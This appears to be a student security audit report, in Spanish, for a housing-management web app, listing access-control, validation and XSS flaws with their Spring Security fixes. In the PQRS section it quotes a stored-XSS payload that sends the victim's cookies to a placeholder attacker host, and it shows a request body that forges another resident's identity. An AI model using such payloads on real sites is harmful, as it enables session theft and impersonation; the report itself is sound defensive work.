# Sustentación de Seguridad y Auditoría Adversarial
**Proyecto:** Housing Control Software
**Módulo:** Ingeniería de Software (Módulo 7)
**Enfoque:** Auditoría Adversarial y Defensa en Profundidad (Zero-Trust)

---

## 1. Introducción y Enfoque Metodológico
Durante el desarrollo de los módulos de **Reservas, PQRS y Visitantes**, se aplicó un modelo de *Auditoría Adversarial*. Este enfoque asume un entorno de "Confianza Cero" (Zero-Trust), donde no se confía en la validación del cliente (Frontend) ni en los datos provistos en el cuerpo de las peticiones HTTP (Payloads). 

A continuación, se exponen las vulnerabilidades críticas halladas (BOLA, XSS, MFLAC y Fallas de Lógica de Negocio) y las remediaciones estructurales aplicadas en el código utilizando el ecosistema de Spring Security y buenas prácticas defensivas.

---

## 2. Módulo de Reservas (HU-05 / HU-06)

### Vulnerabilidad 1: Suplantación de Identidad (BOLA)
* **Descripción:** Un atacante autenticado podía crear reservas a nombre de otro residente modificando el JSON.
* **Payload Original:** 
  ```json
  {
    "zonasComunesId": "uuid-valido",
    "fechaReserva": "2026-11-20T10:00:00",
    "cedulaUsuarios": "9999999999" // Inyección de cédula ajena
  }
  ```
* **Remediación:** 
  Se eliminó el campo `cedulaUsuarios` del `CrearReservaDTO`. La identidad ahora se extrae criptográficamente del token JWT utilizando el contexto de seguridad de Spring:
  ```java
  Authentication auth = SecurityContextHolder.getContext().getAuthentication();
  String cedulaAutenticada = auth.getName();
  ```

### Vulnerabilidad 2: Fallo de Lógica Temporal (Viajes en el tiempo)
* **Descripción:** La API permitía reservar zonas comunes en fechas del pasado, afectando la integridad de la base de datos.
* **Payload Original:** `"fechaReserva": "1990-01-01T00:00:00"`
* **Remediación:** Se implementó el patrón *Fail-Fast* en `ReservaService` para validar la integridad del dato antes de la capa de persistencia:
  ```java
  if (dto.fechaReserva().isBefore(LocalDateTime.now())) {
      throw new IllegalArgumentException("No se pueden crear reservas en el pasado");
  }
  ```

---

## 3. Módulo de PQRS (HU-07 / HU-08)

### Vulnerabilidad 1: Escalada de Privilegios Horizontal a Vertical (MFLAC)
* **Descripción:** Un residente podía consumir el endpoint de administración (`PUT /api/pqrs/{id}`) para marcar su propia queja como "RESUELTA" e inyectar una respuesta falsa.
* **Remediación:** Se protegió el controlador con validación estricta de roles, garantizando que solo el rol `ADMIN` acceda al recurso.
  ```java
  @PutMapping("/{id}")
  @PreAuthorize("hasRole('ADMIN')")
  public ResponseEntity<?> gestionarPqrs(...) { ... }
  ```

### Vulnerabilidad 2: Lectura No Autorizada (IDOR/BOLA)
* **Descripción:** El endpoint `GET /api/pqrs/residente/{cedula}` exponía las quejas de cualquier residente a quien conociera su cédula.
* **Remediación:** Se cambió la arquitectura del endpoint a `GET /mis-solicitudes`. El sistema ya no recibe la cédula por URL, sino que la deduce del token (`SecurityContextHolder`), impidiendo la lectura cruzada de datos.

### Vulnerabilidad 3: Cross-Site Scripting (XSS) Almacenado
* **Descripción:** Los campos `asunto` y `descripcion` aceptaban etiquetas HTML. Al renderizarse en el panel del administrador, podían ejecutar código malicioso.
* **Payload Original:** 
  ```json
  "descripcion": "<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>"
  ```
* **Remediación:** Sanitización de los datos de entrada en `PqrsService` utilizando utilidades nativas de Spring antes de instanciar la entidad:
  ```java
  String descripcionSanitizada = HtmlUtils.htmlEscape(dto.descripcion());
  ```

---

## 4. Módulo de Visitantes (HU-02 / HU-03)

### Vulnerabilidad 1: Evasión de Control Perimetral (MFLAC)
* **Descripción:** Un residente podía invocar el endpoint de ingreso de visitantes sin que el visitante estuviera físicamente en portería.
* **Remediación:** Se delimitó la frontera de confianza exigiendo que únicamente los roles operativos puedan marcar un ingreso:
  ```java
  @PutMapping("/{id}/ingreso")
  @PreAuthorize("hasAnyRole('PORTERIA', 'ADMIN')")
  ```

### Vulnerabilidad 2: Inyección de Tipos (Bad Data / Mass Assignment)
* **Descripción:** PostgreSQL restringe el `tipo_documento` a un ENUM estricto. Un atacante podía enviar un payload inmenso o un tipo inválido forzando una `DataIntegrityViolationException`, exponiendo el *Stack Trace* del servidor.
* **Payload Original:** `"tipoDocumento": "TARJETA_DE_IDENTIDAD_LARGA"`
* **Remediación:** Validación estricta a nivel de aplicación (Java) utilizando una estructura de datos inmutable (`Set`) de alto rendimiento (O(1)) antes de tocar la base de datos:
  ```java
  private static final Set<String> TIPOS_VALIDOS = Set.of("CC", "CE", "NIT", "PASAPORTE");
  
  if (!TIPOS_VALIDOS.contains(dto.tipoDocumento().toUpperCase())) {
      throw new IllegalArgumentException("El tipo de documento debe ser CC, CE, NIT o PASAPORTE");
  }
  ```

---

## 5. Conclusión
Las remediaciones aplicadas trasladaron la responsabilidad de la seguridad del **cliente al servidor**. Al depender criptográficamente del Token (JWT/Session) a través de `SecurityContextHolder` y al aplicar `@PreAuthorize`, la aplicación *Housing Control* logra una arquitectura resiliente, mitigando de raíz las vulnerabilidades más comunes del Top 10 de OWASP para APIs (API1: BOLA, API5: MFLAC y API8: Security Misconfiguration).